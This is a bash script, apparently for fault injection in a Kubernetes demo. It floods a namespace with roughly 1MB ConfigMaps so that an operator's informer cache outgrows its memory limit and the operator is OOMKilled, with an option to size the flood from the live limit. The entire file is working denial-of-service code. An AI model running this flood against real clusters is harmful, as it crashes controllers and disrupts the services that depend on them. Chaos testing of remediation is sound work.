#!/usr/bin/env bash
# Inject ConfigMap flood to trigger operator OOMKill.
# The initial attack uses 100 ConfigMaps at ~1MB each (the Kubernetes maximum);
# recurrence can pass CONFIGMAP_COUNT=auto to scale from the live memory limit.
# The informer deserializes these into typed Go structs with 3-5x overhead,
# exceeding the 128Mi memory limit.
#
# Reference: kubeflow/spark-operator#2878
set -euo pipefail

NAMESPACE="${NAMESPACE:-demo-controllers}"
CONFIGMAP_COUNT="${CONFIGMAP_COUNT:-100}"
CONFIGMAP_START="${CONFIGMAP_START:-1}"
CONFIGMAP_PREFIX="${CONFIGMAP_PREFIX:-app-config}"
TARGET_DEPLOYMENT="${TARGET_DEPLOYMENT:-demo-controllers-controller}"
OOM_MEMORY_OVERHEAD_FACTOR="${OOM_MEMORY_OVERHEAD_FACTOR:-3}"
OOM_MEMORY_HEADROOM="${OOM_MEMORY_HEADROOM:-2.25}"
PAYLOAD_BYTES=1000000
BATCH_SIZE=10

AUTO_SCALE=false
if [ "${CONFIGMAP_COUNT}" = "auto" ]; then
    AUTO_SCALE=true
else
    case "${CONFIGMAP_COUNT}" in
        ''|*[!0-9]*) echo "ERROR: CONFIGMAP_COUNT must be a positive integer or auto" >&2; exit 1 ;;
    esac
fi
case "${CONFIGMAP_START}" in
    ''|*[!0-9]*) echo "ERROR: CONFIGMAP_START must be a positive integer" >&2; exit 1 ;;
esac
[ "${AUTO_SCALE}" = true ] || [ "${CONFIGMAP_COUNT}" -gt 0 ] || {
    echo "ERROR: CONFIGMAP_COUNT must be greater than zero" >&2
    exit 1
}

echo "==> Generating ~1MB attack payload (Kubernetes ConfigMap size limit)..."
dd if=/dev/urandom bs=1024 count=750 of=/tmp/oomkill-payload.bin 2>/dev/null
base64 /tmp/oomkill-payload.bin > /tmp/oomkill-payload.txt
truncate -s "${PAYLOAD_BYTES}" /tmp/oomkill-payload.txt
rm -f /tmp/oomkill-payload.bin
echo "    Payload size: $(wc -c < /tmp/oomkill-payload.txt) bytes"

if [ "${AUTO_SCALE}" = true ]; then
    MEMORY_LIMIT=$(kubectl get deployment "${TARGET_DEPLOYMENT}" -n "${NAMESPACE}" \
        -o jsonpath='{.spec.template.spec.containers[0].resources.limits.memory}' 2>/dev/null || true)
    if [ -z "${MEMORY_LIMIT}" ]; then
        echo "ERROR: unable to read the memory limit from Deployment/${TARGET_DEPLOYMENT} in ${NAMESPACE}" >&2
        exit 1
    fi

    EXISTING_COUNT=$(kubectl get configmaps -n "${NAMESPACE}" \
        -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null \
        | awk -v prefix="${CONFIGMAP_PREFIX}" '$0 ~ ("^" prefix "-[0-9]+$") { count++ } END { print count + 0 }')

    # The informer cache typically expands each 1MB ConfigMap to at least 3x
    # its raw payload. Target about 75% of the live memory limit in raw
    # payload: enough to OOM at the current limit while leaving the next fixed
    # +128Mi remediation increment enough headroom to recover.
    AUTO_SCALE_TARGETS=$(python3 - "${MEMORY_LIMIT}" "${PAYLOAD_BYTES}" \
        "${OOM_MEMORY_OVERHEAD_FACTOR}" "${OOM_MEMORY_HEADROOM}" "${EXISTING_COUNT}" <<'PY'
import re
import sys
from decimal import Decimal, ROUND_CEILING

quantity = sys.argv[1]
payload_bytes = Decimal(sys.argv[2])
overhead = Decimal(sys.argv[3])
headroom = Decimal(sys.argv[4])
existing = int(sys.argv[5])

match = re.fullmatch(r"([0-9]+(?:\.[0-9]+)?)([A-Za-z]*)", quantity)
if not match:
    raise SystemExit(f"unsupported memory quantity: {quantity}")

number, suffix = match.groups()
factors = {
    "": Decimal(1), "m": Decimal("0.001"),
    "k": Decimal(1000), "M": Decimal(1000**2), "G": Decimal(1000**3),
    "T": Decimal(1000**4), "P": Decimal(1000**5), "E": Decimal(1000**6),
    "Ki": Decimal(1024), "Mi": Decimal(1024**2), "Gi": Decimal(1024**3),
    "Ti": Decimal(1024**4), "Pi": Decimal(1024**5), "Ei": Decimal(1024**6),
}
if suffix not in factors:
    raise SystemExit(f"unsupported memory suffix in quantity: {quantity}")
if overhead <= 0 or headroom <= 0:
    raise SystemExit("OOM memory factors must be greater than zero")

limit_bytes = Decimal(number) * factors[suffix]
target_total = int(
    (limit_bytes * headroom / (payload_bytes * overhead)).to_integral_value(
        rounding=ROUND_CEILING
    )
)
target_total = max(target_total, 1)
to_add = max(target_total - existing, 1)
print(f"{target_total}\t{to_add}")
PY
    )
    IFS=$'\t' read -r TARGET_TOTAL CONFIGMAP_COUNT <<EOF_TARGETS
${AUTO_SCALE_TARGETS}
EOF_TARGETS
    echo "==> Auto-sizing flood for ${TARGET_DEPLOYMENT}: memory limit=${MEMORY_LIMIT}, existing=${EXISTING_COUNT}, target=${TARGET_TOTAL}, adding=${CONFIGMAP_COUNT}"
fi

CONFIGMAP_END=$((CONFIGMAP_START + CONFIGMAP_COUNT - 1))
echo "==> Flooding ${CONFIGMAP_COUNT} ConfigMaps (${CONFIGMAP_START}-${CONFIGMAP_END}) into ${NAMESPACE}..."
echo "    Any user with the standard 'edit' ClusterRole can do this."
echo ""

for i in $(seq "${CONFIGMAP_START}" "${CONFIGMAP_END}"); do
    kubectl create configmap "${CONFIGMAP_PREFIX}-${i}" \
        --from-file=data=/tmp/oomkill-payload.txt \
        -n "${NAMESPACE}" 2>/dev/null &
    CREATED_IN_BATCH=$((i - CONFIGMAP_START + 1))
    if [ $((CREATED_IN_BATCH % BATCH_SIZE)) -eq 0 ]; then
        wait
        echo "    Created: ${CREATED_IN_BATCH}/${CONFIGMAP_COUNT}"
    fi
done
wait

ACTUAL=$(kubectl get configmaps -n "${NAMESPACE}" \
    -o jsonpath='{range .items[*]}{.metadata.name}{"\n"}{end}' 2>/dev/null \
    | awk -v prefix="${CONFIGMAP_PREFIX}" '$0 ~ ("^" prefix "-[0-9]+$") { count++ } END { print count + 0 }')
echo ""
echo "==> ConfigMap flood complete: ${ACTUAL} ConfigMaps created."
echo "    Total data: ~${ACTUAL} MB"
echo "    Informer Go struct overhead: ~3-5x -> $((ACTUAL * 3))-$((ACTUAL * 5))MB in cache"
if [ -n "${MEMORY_LIMIT:-}" ]; then
    echo "    Memory limit: ${MEMORY_LIMIT} -> OOMKill expected after the scaled flood."
else
    echo "    Memory limit: current Deployment limit -> OOMKill expected within seconds."
fi

rm -f /tmp/oomkill-payload.txt
